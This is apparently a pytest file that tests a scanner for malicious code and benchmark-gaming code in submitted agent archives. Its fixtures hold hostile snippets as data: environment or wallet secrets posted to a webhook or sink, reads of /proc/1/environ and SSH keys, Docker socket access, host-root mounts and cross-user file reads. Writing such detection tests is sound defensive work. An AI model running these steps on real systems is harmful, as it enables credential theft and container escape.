@pytest.mark.parametrize("level", ["repository", "call"])
@pytest.mark.parametrize("kind", ["missing", "invalid-json"])
def test_unreadable_manifest_set_trusts_nothing_in_review_leads(
    tmp_path: Path, level: str, kind: str
) -> None:
    path, raw = _runtime_pinned_kit_source()
    archive = str(
        _archive_files(tmp_path, {path: raw, _STARTER_MODEL: _stock_starter_model()})
    )
    # A readable runtime manifest pins the file; the broken one sits beside it.
    manifests = (*_STARTER_MANIFESTS, _broken_manifest(tmp_path, kind))

    leads = (
        TarSourceRepository(archive, provenance_manifest_paths=manifests).review_leads()
        if level == "repository"
        else TarSourceRepository(archive).review_leads(manifests)
    )

    # Lead generation continues and the whole set grants nothing, as the
    # starter-model accounting already did: nothing is skipped as starter code.
    assert leads["trusted_starter_skipped"] == 0
    assert leads["files_scanned"] == 1
    assert leads["truncated"] is True
    assert leads["nontext"] == []


@pytest.mark.parametrize("level", ["repository", "call"])
@pytest.mark.parametrize("kind", ["missing", "invalid-json"])
def test_unreadable_manifest_set_trusts_nothing_in_preflight(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, level: str, kind: str
) -> None:
    path, raw = _runtime_pinned_kit_source()
    scanned: list[list[str]] = []

    def recording_detector(
        readable: list[tuple[str, str]], **kwargs: object
    ) -> list[dict[str, object]]:
        scanned.append([name for name, _text in readable])
        return find_decisive_malicious_source(readable, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(
        source_review_module, "find_decisive_malicious_source", recording_detector
    )
    archive = str(_archive_files(tmp_path, {path: raw}))
    assert path in TarSourceRepository(archive)._explicit_runtime_paths()
    manifests = (*_STARTER_MANIFESTS, _broken_manifest(tmp_path, kind))

    if level == "repository":
        TarSourceRepository(
            archive, provenance_manifest_paths=manifests
        ).malicious_preflight(artifact_sha256="a" * 64)
    else:
        TarSourceRepository(archive).malicious_preflight(
            artifact_sha256="a" * 64, provenance_manifest_paths=manifests
        )

    # The pinned runtime file is scanned as the miner's, not trusted.
    assert scanned == [[path]]


@pytest.mark.parametrize("kind", ["missing", "invalid-json"])
def test_unreadable_manifest_still_fails_the_l1_provenance_block(
    tmp_path: Path, kind: str
) -> None:
    archive = str(_archive_files(tmp_path, {"src/main.rs": b"fn main() {}\n"}))
    broken = _broken_manifest(tmp_path, kind)

    # The exact-file provenance report never claims a result from a broken
    # manifest; L1 maps this to its retryable provenance failure.
    with pytest.raises((OSError, ValueError)):
        TarSourceRepository(archive).closest_trusted_provenance((broken,))


@pytest.mark.parametrize("shadow", ["special", "hardlink", "symlink"])
def test_review_leads_hash_only_the_admitted_starter_model_member(
    tmp_path: Path, shadow: str
) -> None:
    # tarfile resolves a name to its last entry. A later link or special entry
    # that the repository skips must not lend the stock digest to the
    # different, same-size regular file it admitted at the starter path.
    stock = _stock_starter_model()
    hidden = "fixtures/models/stock.bin"
    entries: list[tuple[tarfile.TarInfo, bytes]] = []

    def entry(name: str, kind: bytes, raw: bytes = b"", link: str = "") -> None:
        info = tarfile.TarInfo(name)
        info.type = kind
        info.size = len(raw)
        info.linkname = link
        entries.append((info, raw))

    entry("Dockerfile", tarfile.REGTYPE, b"FROM scratch\n")
    if shadow != "special":
        # An unknown entry type is skipped as non-regular, so the hidden stock
        # copy cannot itself mark the lead scan truncated.
        entry(hidden, b"Z", stock)
    entry(_STARTER_MODEL, tarfile.REGTYPE, b"\x00" + b"h" * (len(stock) - 1))
    if shadow == "special":
        entry(_STARTER_MODEL, b"Z", stock)
    elif shadow == "hardlink":
        entry(_STARTER_MODEL, tarfile.LNKTYPE, link=hidden)
    else:
        entry(_STARTER_MODEL, tarfile.SYMTYPE, link="stock.bin")
    path = tmp_path / "agent.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        for info, raw in entries:
            archive.addfile(info, io.BytesIO(raw) if raw else None)
    leads = TarSourceRepository(str(path)).review_leads()
    assert leads["truncated"] is True
    assert leads["nontext"] == []


def test_utf8_only_crate_reports_no_opaque_blobs(tmp_path: Path) -> None:
    repo = TarSourceRepository(str(_archive_with(tmp_path, {})))
    inventory = json.loads(repo.inventory())
    assert inventory["opaque_blobs"] == []
    assert inventory["binary_analysis"] == []


def test_generator_mirroring_constellation_supports_auditable_finding(
    tmp_path: Path,
) -> None:
    source = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &[
    "What city do I live in?", "Where do I work now?",
    "Which university did I attend?", "How many projects did I mention?",
    "List every trip I described.", "What did I use to drive before?",
];
const FACTS: &[&str] = &[
    "I moved to Northport.", "I work at Example Labs.", "I drive a hatchback.",
    "I studied at Northport College.", "I play an instrument.",
    "My project is Atlas.", "My favorite cuisine changed recently.",
];
const EVENT_LABELS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge_question_to_fact(question: &str, query: &str, fact: &str, memory: &str,
    attribute: &str, value: &str) {
    let _ = (extract(question), retrieve(query, memory), match_fact(fact),
        keyword(attribute), value);
}
fn deterministic_response() -> Option<String> { return Some(answer()); }
fn run() -> String {
    if let Some(answer) = deterministic_response() { return answer; }
    otherwise_call_model_inference_provider()
}
"""
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {"src/memory_solver.rs": source}))
    )

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is True
    assert analysis["served_runtime_candidate"] is True
    assert {
        location["dimension"] for location in analysis["served_runtime_locations"]
    } == {
        "question_templates",
        "retrieval_vocabulary_bridge",
        "deterministic_answer_path",
    }
    assert analysis["matched_dimensions"] == [
        "attribute_ontology",
        "question_templates",
        "fact_update_frames",
        "event_label_frames",
        "retrieval_vocabulary_bridge",
        "deterministic_answer_path",
    ]
    dimensions = analysis["dimensions"]
    assert all(
        location["path"] == "src/memory_solver.rs"
        and isinstance(location["line"], int)
        and location["line"] > 0
        for dimension in dimensions.values()
        for location in dimension["locations"]
    )
    assert analysis["disposition"] == "requires-runtime-causal-review"
    assert "text" not in json.dumps(analysis)

    observation = source_review_module._parse_review(
        _with_policy_v10_invariants(
            {
                "risk_level": "high",
                "confidence": 0.96,
                "categories": ["benchmark_emulation"],
                "evidence": [
                    {
                        "path": "src/memory_solver.rs",
                        "line": line,
                        "category": "benchmark_emulation",
                    }
                    for line in (1, 4, 8, 13, 21, 22)
                ],
                "summary": (
                    "Coordinated public-generator mirror returns deterministic answers "
                    "before inference."
                ),
            }
        ),
        artifact_sha256=_SHA,
        repository=repo,
    )
    assert observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    assert observation.finding is not None
    assert observation.finding[
        "prompt_revision"
    ] == source_review_module._prompt_revision(SCREENING_POLICY_VERSION)
    assert observation.finding["evidence"] == [
        {
            "path": "src/memory_solver.rs",
            "line": line,
            "category": "benchmark_emulation",
        }
        for line in (1, 4, 8, 13, 21, 22)
    ]


def test_served_generator_candidate_ignores_one_generic_task_prompt(
    tmp_path: Path,
) -> None:
    source = b"""\
const PROMPT: &str = "How many projects should I list?";
pub async fn run(question: &str) -> RunResponse {
    let memory = retrieve(question);
    let answer = model(memory).await;
    RunResponse { final_text: answer, answer: None, abstain: None }
}
"""
    repo = TarSourceRepository(str(_archive_files(tmp_path, {"src/agent.rs": source})))

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["served_runtime_candidate"] is False
    assert analysis["served_runtime_locations"] == []


def test_generator_words_in_model_authored_runtime_are_not_served_hold(
    tmp_path: Path,
) -> None:
    source = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &["What city?", "Where do I work?",
    "Which project?", "How many trips?", "List pets", "What did I use before?"];
const FACTS: &[&str] = &["I moved city", "I work company", "I drive car",
    "I studied university", "I play instrument", "My project changed"];
const EVENTS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge(question: Query, query: Query, fact: Fact, memory: Memory,
    attribute: Attr, value: Value) { extract(question); retrieve(query, memory);
    match_fact(fact); keyword(attribute); use_value(value); }
fn run() -> Answer {
    let answer = model_inference_provider(retrieve(query, memory));
    if valid(answer) { return answer; }
    otherwise_call_model_inference_provider()
}
"""
    repo = TarSourceRepository(str(_archive_files(tmp_path, {"src/agent.rs": source})))

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is True
    assert analysis["served_runtime_candidate"] is False
    assert analysis["served_runtime_locations"] == []


def test_generator_scan_prioritizes_runtime_source_over_decoy_files(
    tmp_path: Path,
) -> None:
    runtime = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &["What city?", "Where work?", "Which project?",
    "How many trips?", "List pets", "What was used before?"];
const FACTS: &[&str] = &["I moved city", "I work company", "I drive car",
    "I studied university", "I play instrument", "My project changed"];
const EVENTS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge(question: Query, query: Query, fact: Fact, memory: Memory,
    attribute: Attr, value: Value) { extract(question); retrieve(query, memory);
    match_fact(fact); keyword(attribute); use_value(value); }
fn direct_answer() -> Answer { return deterministic_answer(); }
fn run() -> Answer { if ready() { return direct_answer(); } call_model_inference(); }
"""
    files = {
        **{f"docs/decoy-{index:04}.md": b"irrelevant" for index in range(2048)},
        "src/runtime.rs": runtime,
    }
    repo = TarSourceRepository(str(_archive_files(tmp_path, files)))

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is True
    assert analysis["scanned_runtime_source_files"] == 1


@pytest.mark.parametrize(
    "name,source",
    [
        (
            "ordinary-schema",
            "struct Profile { city: String, employer: String, car: String, "
            "university: String, instrument: String, projects: Vec<String>, "
            "trips: Vec<String>, pets: Vec<String>, cuisine: String, color: String }",
        ),
        (
            "generic-retrieval",
            "fn retrieve(question: Query, memory: Memory) -> Fact { "
            "extract(question.value); match_fact(memory.attribute); keyword_search() }",
        ),
        (
            "public-benchmark-comment",
            "// DittoBench uses scalar and list attributes, question templates, "
            "// fact updates, event labels, and retrieval.\nfn call_model() {}",
        ),
        (
            "generic-direct-answer",
            "fn run() { if let Some(answer) = deterministic_response() "
            "{ return answer; } "
            "otherwise_call_model_provider(); }",
        ),
    ],
)
def test_isolated_schema_retrieval_or_benchmark_mentions_do_not_form_candidate(
    tmp_path: Path, name: str, source: str
) -> None:
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {f"src/{name}.rs": source.encode()}))
    )

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is False
    assert analysis["disposition"] == "no-aggregate-candidate"


@pytest.mark.parametrize(
    ("expected_category", "source"),
    [
        (
            "malicious_build",
            'let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);',
        ),
        (
            "malicious_build",
            'let boundary = "/proc/1/root";\nmount_host_boundary(boundary);',
        ),
        (
            "credential_access",
            'let path = "/proc/1/environ";\nlet data = read_secret_path(path);',
        ),
        (
            "cross_user_access",
            'let home = "/root/.config";\nscan_cross_user_home(home);',
        ),
        (
            "data_exfiltration",
            "let secret = os.environ.clone();\nhttp_client.post(callback, secret);",
        ),
    ],
)
def test_decisive_malicious_preflight_categories(
    expected_category: str, source: str
) -> None:
    findings = find_decisive_malicious_source([("src/runtime.rs", source)])
    assert expected_category in {item["category"] for item in findings}


def test_decisive_preflight_allows_a_targeted_api_key_read_beside_a_post() -> None:
    """One named key plus an outbound call is an API client, not a leak.

    Reproduces white-bolt v2 (artifact 55e3d522) and Omar-miner_v9, both
    quarantined at confidence 1.0 for a dev script that reads the provider key
    it is about to authenticate with. The key never leaves the provider that
    issued it, so there is nothing exfiltrated.
    """
    findings = find_decisive_malicious_source(
        [
            (
                "scripts/system-transport-probe.py",
                'api_key = os.environ.get("OPENROUTER_API_KEY", "").strip()\n'
                "results = post_completion(base_url=base_url, api_key=api_key)\n",
            ),
            (
                "src/runtime.rs",
                'let key = std::env::var("OPENROUTER_API_KEY").unwrap_or_default();\n'
                "let response = http_client.post(url).bearer_auth(key).send();\n",
            ),
        ]
    )
    assert findings == []


def test_decisive_preflight_still_flags_whole_environment_capture() -> None:
    """Enumerating the environment beside an outbound call stays decisive."""
    for source in (
        "payload = dict(os.environ)\nrequests.post(webhook, json=payload)",
        "for name in os.environ:\n    upload(name)",
        "let all = std::env::vars().collect();\nreqwest::Client::new().post(sink);",
        'let raw = read("/proc/self/environ");\nhttp_client.post(callback, raw);',
    ):
        findings = find_decisive_malicious_source([("src/runtime.rs", source)])
        assert "data_exfiltration" in {item["category"] for item in findings}, source


def test_decisive_preflight_still_flags_targeted_wallet_reads() -> None:
    """A named lookup is only forgiven for the environment, not for wallets."""
    findings = find_decisive_malicious_source(
        [
            (
                "src/runtime.rs",
                'let seed = read(".bittensor/wallets/default");\n'
                "http_client.post(sink, seed);",
            )
        ]
    )
    assert "data_exfiltration" in {item["category"] for item in findings}


def test_decisive_preflight_allows_injected_endpoint_and_timeout_config() -> None:
    """Endpoint and timeout configuration is not cross-user access.

    Reproduces the #2099 hold class (observed on Sky v1) with sanitized,
    representative configuration: no miner source is reproduced here. Two
    ordinary shapes combined into a 100%-confidence pre-build quarantine --
    `/host` inside the `http://host.docker.internal` authority satisfied the
    filesystem-path role, and a declared `read_timeout` field satisfied the
    access-effect role on a bare `\\w*` match. Neither is a read of another
    user's data, and the hold landed before build, runtime-isolation, and tool
    checks could run.
    """
    findings = find_decisive_malicious_source(
        [
            (
                "src/inference/config.rs",
                "use std::time::Duration;\n"
                "pub struct InferenceConfig {\n"
                "    pub base_url: String,\n"
                "    pub read_timeout: Duration,\n"
                "    pub write_timeout: Duration,\n"
                "}\n"
                "impl InferenceConfig {\n"
                "    pub fn from_env() -> Self {\n"
                '        let base_url = std::env::var("DITTO_INFERENCE_BASE_URL")\n'
                "            .unwrap_or_else(|_| "
                '"http://host.docker.internal:11434/v1".to_string());\n'
                "        let read_timeout = Duration::from_secs(600);\n"
                "        let write_timeout = Duration::from_secs(30);\n"
                "        Self { base_url, read_timeout, write_timeout }\n"
                "    }\n"
                "}\n",
            ),
            (
                "src/runtime.py",
                "import os\n"
                'BASE_URL = os.environ.get("DITTO_INFERENCE_BASE_URL",\n'
                '                          "http://host.docker.internal:8000/v1")\n'
                "READ_TIMEOUT_SECONDS = 600.0\n"
                "def client():\n"
                "    return OpenAiChatClient(base_url=BASE_URL,\n"
                "                            read_timeout=READ_TIMEOUT_SECONDS)\n",
            ),
        ]
    )

    assert findings == []


def test_decisive_preflight_still_flags_a_served_cross_user_read() -> None:
    """A served read of another principal's files stays decisive.

    The narrowing above removes a URL authority and a config field name; it
    must not remove the shape the rule exists for. Each fixture reaches a real
    filesystem location belonging to another user through a real read/walk
    call, which is the S1 cross-user-access bar.
    """
    for path, source in (
        (
            "src/served/handler.rs",
            'let other = request.query("peer_user");\n'
            'let target = format!("/home/{}/.ditto/memory.json", other);\n'
            "let borrowed = std::fs::read_to_string(&target)?;\n"
            "Response::text(borrowed)\n",
        ),
        (
            "src/harvest.rs",
            'let base = "/Users/";\n'
            "for entry in walkdir::WalkDir::new(base) {\n"
            "    collected.push(entry?.path().to_path_buf());\n"
            "}\n",
        ),
        (
            "src/runtime.py",
            'TARGET = "file:///home/otheruser/.ditto/memory.db"\n'
            'blob = open(TARGET.removeprefix("file://"), "rb").read()\n',
        ),
        # URL schemes are case-insensitive, so an upper-case file URL names the
        # same local path and must not be masked as a remote endpoint.
        (
            "src/served/upper.py",
            'TARGET = "FILE:///home/other/.ditto/memory.db"\n'
            'blob = open(TARGET.removeprefix("FILE://"), "rb").read()\n',
        ),
        (
            "src/escape.rs",
            'let host_copy = "/proc/1/root/home/other/notes";\n'
            "let body = std::fs::read(host_copy)?;\n",
        ),
    ):
        findings = find_decisive_malicious_source([(path, source)])
        assert "cross_user_access" in {item["category"] for item in findings}, path


def test_decisive_malicious_preflight_ignores_inert_regression_material() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "tests/security_canary.rs",
                'assert_blocked("/var/run/docker.sock"); read_fixture(".env");',
            ),
            (
                "docs/security.md",
                "Never mount the host root or upload a credential.",
            ),
            (
                "src/agent.rs",
                "// /var/run/docker.sock connect mount host\n"
                "fn run() { call_model(); }",
            ),
            (
                "src/prompt.rs",
                'let security_prompt = r#"Never read, open, scan, or copy\n'
                "/proc/1/environ or credential files.\n"
                'Do not upload them."#;',
            ),
        ]
    )
    assert findings == []


@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
def test_rust_cfg_test_cross_user_fixture_holds_preflight(
    tmp_path: Path, mode: str
) -> None:
    # The build could compile the test module in; nothing proves it off.
    source = (
        "fn main() { serve(); }\n"
        "fn serve() { call_model(); }\n"
        "#[cfg(test)]\n"
        "mod tests {\n"
        "    fn rejects_foreign_home() {\n"
        '        let path = "/root/private";\n'
        "        read(path);\n"
        "    }\n"
        "}\n"
    )
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM rust:bookworm AS build\nCOPY . .\n"
                        b"RUN cargo build --release\nFROM scratch\n"
                        b"COPY --from=build /target/release/app /app\n"
                        b'ENTRYPOINT ["/app"]\n'
                    ),
                    "Cargo.toml": b"[package]\nname='app'\nversion='0.1.0'\n",
                    "src/main.rs": source.encode(),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64, mode=mode)

    assert observation is not None
    assert "cross_user_access" in observation.categories


# Maintainer counterexample on #2565: the decisive preflight skipped a
# cfg(test) function that a `rustc --cfg test` build serves as main.
_CFG_TEST_SECRET_MAIN = (
    '#[cfg(test)]\nfn main() { let _ = read_secret_path("/root/.ssh/id_rsa"); }\n'
)
_RUSTC_CFG_TEST_BUILD = (
    b"FROM rust:1 AS build\n"
    b"WORKDIR /src\n"
    b"COPY src ./src\n"
    b"RUN rustc --cfg test src/main.rs -o /app/server\n"
    b"FROM debian:trixie-slim\n"
    b"COPY --from=build /app/server /app/server\n"
    b'CMD ["/app/server"]\n'
)


def test_decisive_detector_reads_cfg_test_items_by_default() -> None:
    findings = find_decisive_malicious_source([("src/main.rs", _CFG_TEST_SECRET_MAIN)])

    assert {finding["category"] for finding in findings} == {
        "credential_access",
        "cross_user_access",
    }


@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
def test_preflight_holds_cfg_test_code_a_rustc_cfg_test_build_serves(
    tmp_path: Path, mode: str
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": _RUSTC_CFG_TEST_BUILD,
            "src/main.rs": _CFG_TEST_SECRET_MAIN.encode(),
        },
    )

    observation = TarSourceRepository(
        str(archive), static_preflight_v2_mode=mode
    ).malicious_preflight(artifact_sha256="a" * 64, mode=mode)

    assert observation is not None
    assert {"credential_access", "cross_user_access"} <= set(observation.categories)


@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
def test_inert_ordinary_rust_test_module_raises_no_preflight_finding(
    tmp_path: Path, mode: str
) -> None:
    # Scanning test code is safe for ordinary tests: even compiled in, they
    # touch no credential, host path, control socket, or exfiltration sink.
    source = (
        "pub fn parse_answer(text: &str) -> u32 {\n"
        "    text.trim().parse().unwrap_or(0)\n"
        "}\n"
        "\n"
        "fn main() {\n"
        '    println!("{}", parse_answer("42"));\n'
        "}\n"
        "\n"
        "#[cfg(test)]\n"
        "mod tests {\n"
        "    use super::*;\n"
        "\n"
        "    #[test]\n"
        "    fn parses_answer() {\n"
        '        assert_eq!(parse_answer(" 42 "), 42);\n'
        '        assert_eq!(parse_answer("x"), 0);\n'
        "    }\n"
        "}\n"
    )
    archive = _archive_files(
        tmp_path,
        {"Dockerfile": _RUSTC_CFG_TEST_BUILD, "src/main.rs": source.encode()},
    )

    assert find_decisive_malicious_source([("src/main.rs", source)]) == []
    assert (
        TarSourceRepository(
            str(archive), static_preflight_v2_mode=mode
        ).malicious_preflight(artifact_sha256="a" * 64, mode=mode)
        is None
    )


@pytest.mark.parametrize(
    "kit", ["dittobench-starter-kit", "dittobench-coding-starter-kit"]
)
def test_stock_starter_kits_raise_no_decisive_finding_with_test_code(
    tmp_path: Path, kit: str
) -> None:
    root = Path(__file__).resolve().parents[3] / "miners" / kit
    if not root.is_dir():
        pytest.skip(f"{kit} is not part of this checkout")
    files: dict[str, bytes] = {}
    for relative in starter_files(root):
        raw = (root / relative).read_bytes()
        try:
            raw.decode("utf-8")
        except UnicodeDecodeError:
            continue
        files[relative] = raw
    text = [(path, raw.decode()) for path, raw in files.items()]

    # Test code is scanned now, so the kits' own tests must stay inert. Every
    # file is treated as executable here, so a decisive match may only cite
    # files the kit's build provably never copies, which is exactly how
    # malicious_preflight clears its broad legacy inventory below. A match in
    # served code, test items included, fails.
    reachability = analyze_reachability(dict(text))
    for match in find_decisive_malicious_source(
        text, explicitly_executable_paths=frozenset(files)
    ):
        for location in match["locations"]:
            assert (
                reachability[str(location["path"])].state
                == ReachabilityState.PROVEN_INERT
            ), match
    archive = str(_archive_files(tmp_path, files))
    for mode in ("off", "shadow", "enforce"):
        repository = TarSourceRepository(archive, static_preflight_v2_mode=mode)
        assert (
            repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
        )


def test_rust_cfg_test_does_not_hide_adjacent_served_cross_user_access() -> None:
    source = (
        "#[cfg(test)]\n"
        "mod tests {\n"
        '    fn local() { let path = "/root/test-fixture"; read(path); }\n'
        "}\n"
        'fn serve() { let path = "/root/private"; read(path); }\n'
    )

    findings = find_decisive_malicious_source(
        [("src/baseline.rs", source)], include_test_only=False
    )

    assert any(
        finding["category"] == "cross_user_access"
        and {item["line"] for item in finding["locations"]} == {5}
        for finding in findings
    )


def test_rust_test_literal_brace_cannot_hide_following_served_item() -> None:
    source = (
        "#[cfg(test)]\n"
        "mod tests {\n"
        '    fn local() { let template = "{"; assert!(!template.is_empty()); }\n'
        "}\n"
        'fn serve() { let path = "/root/private"; read(path); }\n'
    )

    findings = find_decisive_malicious_source(
        [("src/baseline.rs", source)], include_test_only=False
    )

    assert any(
        finding["category"] == "cross_user_access"
        and {item["line"] for item in finding["locations"]} == {5}
        for finding in findings
    )


def test_enforced_preflight_keeps_served_access_after_rust_test_literal(
    tmp_path: Path,
) -> None:
    source = (
        "#[cfg(test)]\n"
        "mod tests {\n"
        '    fn local() { let template = "{"; assert!(!template.is_empty()); }\n'
        "}\n"
        'fn serve() { let path = "/root/private"; read(path); }\n'
        "fn main() { serve(); }\n"
    )
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM rust:bookworm AS build\nCOPY . .\n"
                b"RUN cargo build --release\nFROM scratch\n"
                b"COPY --from=build /target/release/app /app\n"
                b'ENTRYPOINT ["/app"]\n'
            ),
            "Cargo.toml": b"[package]\nname='app'\nversion='0.1.0'\n",
            "src/main.rs": source.encode(),
        },
    )

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64, mode="enforce"
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v2"
    assert observation.categories == ("cross_user_access",)
    assert {item["line"] for item in observation.finding["evidence"]} == {5}


def test_rust_attribute_text_inside_raw_string_cannot_hide_served_item() -> None:
    source = (
        'const GUIDE: &str = r#"\n#[cfg(test)]\nmod tests {\n"#;\n'
        'fn serve() { let path = "/root/private"; read(path); }\n'
    )

    findings = find_decisive_malicious_source(
        [("src/baseline.rs", source)], include_test_only=False
    )

    assert any(
        finding["category"] == "cross_user_access"
        and {item["line"] for item in finding["locations"]} == {5}
        for finding in findings
    )


@pytest.mark.parametrize(
    "attribute",
    ["#[cfg(not(test))]", '#[cfg(any(test, feature = "production"))]'],
)
def test_rust_cfg_branch_that_can_run_in_production_remains_decisive(
    attribute: str,
) -> None:
    source = f'{attribute}\nfn serve() {{ let path = "/root/private"; read(path); }}\n'

    findings = find_decisive_malicious_source(
        [("src/baseline.rs", source)], include_test_only=False
    )

    assert any(finding["category"] == "cross_user_access" for finding in findings)


def test_decisive_preflight_ignores_nested_inert_regression_material() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "vendor/dependency/tests/security_canary.rs",
                'assert_blocked("/var/run/docker.sock"); read_fixture(".env");',
            ),
            (
                "dependency/docs/security_example.py",
                'connect_control_socket("/var/run/docker.sock")',
            ),
        ]
    )

    assert findings == []


def test_decisive_preflight_keeps_runtime_beside_nested_inert_material() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "vendor/dependency/tests/security_canary.rs",
                'assert_blocked("/var/run/docker.sock");',
            ),
            (
                "vendor/dependency/src/runtime.rs",
                'let endpoint = "/var/run/docker.sock";\n'
                "connect_control_socket(endpoint);",
            ),
        ]
    )

    assert "malicious_build" in {item["category"] for item in findings}


def test_decisive_preflight_keeps_runtime_under_src_named_tests() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "src/tests/runtime.rs",
                'let endpoint = "/var/run/docker.sock";\n'
                "connect_control_socket(endpoint);",
            )
        ]
    )

    assert "malicious_build" in {item["category"] for item in findings}


def test_decisive_malicious_preflight_keeps_real_effect_beside_prompt() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "src/runtime.rs",
                'let security_prompt = "Never read /proc/1/environ";\n'
                'let stolen = read_secret_path("/proc/1/environ");',
            )
        ]
    )

    assert "credential_access" in {item["category"] for item in findings}


def test_decisive_malicious_preflight_masks_strings_after_triple_quotes() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "scripts/local-lab.py",
                '"""Local development helper."""\n'
                "def child_environment(pass_env):\n"
                "    safe = {name for name in os.environ if name.startswith('LC_')}\n"
                "    for name in pass_env:\n"
                "        if name not in os.environ:\n"
                '            raise ValueError(f"requested environment variable '
                'is not set: {name}")\n'
                "    return {name: os.environ[name] for name in safe}\n",
            )
        ]
    )

    assert findings == []


def test_decisive_malicious_preflight_detects_effect_after_triple_quotes() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "src/runtime.py",
                '"""Runtime entrypoint."""\n'
                "secret = os.environ.copy()\n"
                "http_client.post(callback, secret)\n",
            )
        ]
    )

    assert "data_exfiltration" in {item["category"] for item in findings}


def test_repository_preflight_emits_digest_bound_location_only_finding(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/runtime.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    )
                },
            )
        )
    )
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)
    assert observation is not None
    assert observation.risk_level == "high"
    assert observation.finding_digest
    serialized = json.dumps(observation.finding)
    assert "docker-control-plane" in serialized
    assert "/var/run/docker.sock" not in serialized


def test_repository_preflight_prioritizes_runtime_over_archive_padding(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(source_review_module, "_MAX_LEAD_SCAN_FILES", 2)
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "000-docs.md": b"ordinary documentation",
                    "001-notes.md": b"ordinary notes",
                    "src/runtime.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_scans_custom_cargo_build_path(tmp_path: Path) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": (
                        b'[package]\nname = "agent"\nversion = "0.1.0"\n'
                        b'build = "vendor/dependency/tests/payload.rs"\n'
                    ),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_ignores_unshipped_local_docker_launcher(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM rust:bookworm AS build\n"
                        b"COPY Cargo.toml Cargo.lock ./\n"
                        b"COPY src ./src\n"
                        b"RUN cargo build --locked --release\n"
                        b'ENTRYPOINT ["/app/dittobench-miner"]\n'
                    ),
                    "Cargo.toml": (b'[package]\nname = "agent"\nversion = "0.1.0"\n'),
                    "src/main.rs": b"fn main() {}\n",
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "run-miner.sh" not in runtime_paths
    assert observation is None


@pytest.mark.parametrize(
    "dockerfile",
    [
        b"FROM base\nCOPY . .\nRUN ./run-miner.sh\n",
        b'FROM base\nCOPY . .\nENTRYPOINT ["./run-miner.sh"]\n',
        (
            b"FROM base\nCOPY run-miner.sh /usr/local/bin/agent-entry\n"
            b'CMD ["/usr/local/bin/agent-entry"]\n'
        ),
    ],
)
def test_repository_preflight_scans_docker_invoked_shell_launcher(
    tmp_path: Path, dockerfile: bytes
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": dockerfile,
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "run-miner.sh" in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


